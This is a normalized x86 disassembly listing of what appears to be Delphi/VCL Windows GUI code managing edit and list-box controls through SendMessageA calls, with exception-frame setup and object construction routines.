mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_436af3
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436afa
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
push 0x0
push edi
push 0xbb
mov eax [ esi + 0x10 ]
call sub_446450
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jl r-xdata
push 0x0
dec edi
push edi
push 0xbb
mov eax [ esi + 0x10 ]
call sub_446450
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jl r-xdata
lea eax [ ebp - 0x8 ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_40424c
jmp r-xdata
push 0x0
push ebx
push 0xc1
mov eax [ esi + 0x10 ]
call sub_446450
push eax
call SendMessageA
test eax eax
je r-xdata
push ebx
push ebx
push 0xb1
mov eax [ esi + 0x10 ]
call sub_446450
push eax
call SendMessageA
mov eax [ ebp - 0x8 ]
call sub_404400
push eax
push 0x0
push 0xc2
mov eax [ esi + 0x10 ]
call sub_446450
push eax
call SendMessageA
add ebx eax
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_40424c
sub_436b07
inc [ edx ]
add [ eax ] al
add [ 0xa ] cl
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov edi edx
mov ebx eax
push 0x0
push edi
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_446450
push eax
call SendMessageA
mov esi eax
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
inc edi
push edi
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_446450
push eax
call SendMessageA
mov edi eax
test edi edi
jge r-xdata
push edi
push esi
push 0xb1
mov eax [ ebx + 0x10 ]
call sub_446450
push eax
call SendMessageA
mov eax [ rw-data ]
push eax
push 0x0
push 0xc2
mov eax [ ebx + 0x10 ]
call sub_446450
push eax
call SendMessageA
push 0x0
push esi
push 0xc1
mov eax [ ebx + 0x10 ]
call sub_446450
push eax
call SendMessageA
mov edi eax
add edi esi
sub_436bb4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
call sub_446754
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_446450
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ esi + 0x10 ]
call sub_440d98
mov eax [ esi + 0x10 ]
call sub_4400ec
sub_436c18
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_436ce1
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax esi
call sub_408170
mov eax [ ebp - 0x4 ]
call sub_404200
mov esi eax
mov eax [ ebx + 0x10 ]
call sub_43fb24
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push 0x0
push 0xc
mov eax [ ebx + 0x10 ]
call sub_446450
push eax
call SendMessageA
test eax eax
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x10 ]
call sub_43fbb0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40434c
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax [ ebx + 0x10 ]
call sub_440d98
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436ce8
lea eax [ ebp - 0xc ]
call sub_403f40
lea eax [ ebp - 0x8 ]
call sub_403f40
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_436cf0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_436000
mov edx 0xb9
mov eax ebx
call sub_43f36c
mov edx 0x59
mov eax ebx
call sub_43f390
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebx + 0x226 ] 0x1
mov [ ebx + 0x227 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov esi eax
mov [ ebx + 0x220 ] esi
mov [ esi + 0x10 ] ebx
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xbc ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_436d80
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x220 ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44221c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_436db0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_436468
mov eax ebx
mov si 0xffc8
call sub_403368
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x224 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
xor ecx ecx
mov cl [ ebx + 0x226 ]
mov ecx [ ecx * 4 + rw-data ]
not ecx
and edx ecx
or edx 0x4
or eax edx
xor edx edx
mov dl [ ebx + 0x225 ]
or eax [ edx * 4 + rw-data ]
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_436e14
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx r-xdata
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406d1c
mov [ esi + 0x180 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ ebx + 0x5 ] 0x8
je r-xdata
mov eax [ ebx + 0x4 ]
and eax 0xfffff7ff
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx r-xdata
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406d1c
mov edi eax
mov [ esi + 0x180 ] edi
test edi edi
je r-xdata
mov eax [ ebx ]
push eax
push 0x0
push 0xc
mov eax [ esi + 0x180 ]
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push edi
call SendMessageA
jmp r-xdata
sub_436edd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
push 0x0
push 0x0
push 0xb0
mov eax ebx
call sub_446450
push eax
call SendMessageA
shr eax 0x10
movzx eax ax
mov [ esi ] eax
push 0x0
mov eax [ esi ]
push eax
push 0xc9
mov eax ebx
call sub_446450
push eax
call SendMessageA
mov [ esi + 0x4 ] eax
push 0x0
push 0xffffffff
push 0xbb
mov eax ebx
call sub_446450
push eax
call SendMessageA
sub [ esi ] eax
pop esi
pop ebx
retn
sub_436f40
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov eax [ esi + 0x4 ]
push eax
push 0xbb
mov eax ebx
call sub_446450
push eax
call SendMessageA
add eax [ esi ]
mov esi eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_446450
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_436fe8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x228 ] 0x0
je r-xdata
and [ esi + 0xc ] 0xfffffffd
or [ esi + 0xc ] 0x2
jmp r-xdata
pop esi
pop ebx
retn
and [ esi + 0xc ] 0xfffffffb
cmp [ ebx + 0x227 ] 0x0
jne r-xdata
sub_437024
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445434
cmp [ esi ] 0xd
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x227 ] 0x0
jne r-xdata
mov [ esi ] 0x0
sub_437048
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4420c4
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_43706c
push ebx
mov ebx eax
mov eax ebx
call sub_44bfd0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4370a4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_4370fa
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_437108
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4420f8
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_43715c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_446edc
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_4371b4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_443de0
mov eax ebx
mov si 0xffb5
call sub_403368
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_446450
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_403368
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_43722c
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_432b54
mov ebx eax
mov eax ebx
call sub_432c34
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_446450
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_432dcc
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_437278
push ebx
push esi
mov esi edx
mov ebx eax
call sub_432b54
call sub_432c34
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_444820
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_4372a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443258
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_4372dc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_437108
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_43f36c
mov edx 0x19
mov eax esi
call sub_43f390
mov dl 0x1
mov eax esi
call sub_446684
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_437368
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_446754
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_446450
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_446450
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_4373bc
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_446754
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_457570
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_440d98
sub_4373f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4372a4
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_443184
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_437458
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_4458cc
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_457478
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_403368
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403368
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4374c5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43753e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43fbb0
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_457500
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_4458d4
mov eax ebx
mov si 0xffb8
call sub_403368
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403368
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437545
sub_43754c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_4458dc
pop edi
pop esi
pop ebx
retn
sub_4375a0
push ebx
push esi
mov esi edx
mov ebx eax
call sub_432b54
call sub_432c34
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_4375cc
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_432b54
mov ebx eax
mov eax ebx
call sub_432c34
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_446450
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_432dcc
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_437634
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4376f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
push 0x0
push edi
push 0x18a
mov eax esi
call sub_446450
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_4392e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_40458c
test esi esi
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax ebx
call sub_419270
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4376ff
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_404400
push eax
push edi
push 0x189
mov eax [ ebx + 0x10 ]
call sub_446450
push eax
call SendMessageA
mov esi eax
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_40458c
sub_437708
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43778b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffb1
call sub_403368
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_439308
mov esi eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437792
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_419270
sub_43779c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ esp + 0x4 ] eax
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb3
call sub_403368
mov [ esp + 0x8 ] eax
xor ecx ecx
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_403368
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push 0x0
mov ecx [ esp + 0x4 ]
mov edx ebp
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x64 ]
mov ecx [ esp + 0x8 ]
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_403368
mov edx [ esp + 0x4 ]
mov eax [ edi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43781c
push esi
mov esi eax
cmp edx 0xffffffff
je r-xdata
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
mov eax [ esi + 0x10 ]
mov si 0xffb0
call sub_403368
sub_437844
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4378d1
push [ fs : eax ]
mov [ fs : eax ] esp
or esi 0xffffffff
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4378d8
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
mov eax [ ebp - 0x4 ]
call sub_404400
push eax
push 0x0
push 0x180
mov eax edi
call sub_446450
push eax
call SendMessageA
mov esi eax
test esi esi
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
sub_4378e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43796d
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437974
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
mov eax [ ebp - 0x4 ]
call sub_404400
push eax
push edi
push 0x181
mov eax esi
call sub_446450
push eax
call SendMessageA
test eax eax
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
sub_43798c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_437adc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437ae3
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f64
retn
mov eax [ ebp - 0x4 ]
call sub_4190f4
xor eax eax
push ebp
push sub_437aba
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_403368
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov si 0xffb3
call sub_403368
mov ecx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb2
call sub_403368
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_403368
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp ebx eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp edi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4191b0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_437afc
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_446450
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_4400ec
sub_437b30
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax edi
call sub_404400
push eax
push 0xffffffff
push 0x1a2
mov eax esi
call sub_446450
push eax
call SendMessageA
mov edx edi
mov eax esi
call sub_439330
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_437b74
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_437c73
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437c7a
lea eax [ ebp - 0xc ]
call sub_403f40
retn
mov eax [ ebp - 0x4 ]
call sub_4190f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x1
xor eax eax
push ebp
push sub_437c56
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_4191b0
retn
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_403368
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
xor ecx ecx
mov edx ebx
mov si 0xffb2
call sub_403368
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_403368
sub_437c84
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4420f8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax ebx
call sub_43f36c
mov edx 0x61
mov eax ebx
call sub_43f390
mov dl 0x1
mov eax ebx
call sub_446684
xor edx edx
mov eax ebx
call sub_43fd74
mov [ ebx + 0x210 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov esi eax
mov [ ebx + 0x218 ] esi
mov [ esi + 0x10 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_422348
mov esi eax
mov [ ebx + 0x228 ] esi
mov eax esi
mov edx ebx
call sub_43e78c
mov [ ebx + 0x230 ] 0x10
mov [ ebx + 0x224 ] 0x1
mov [ ebx + 0x23b ] 0x1
mov [ ebx + 0x234 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_437d70
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44221c
mov eax [ esi + 0x228 ]
call sub_40316c
mov eax [ esi + 0x218 ]
call sub_40316c
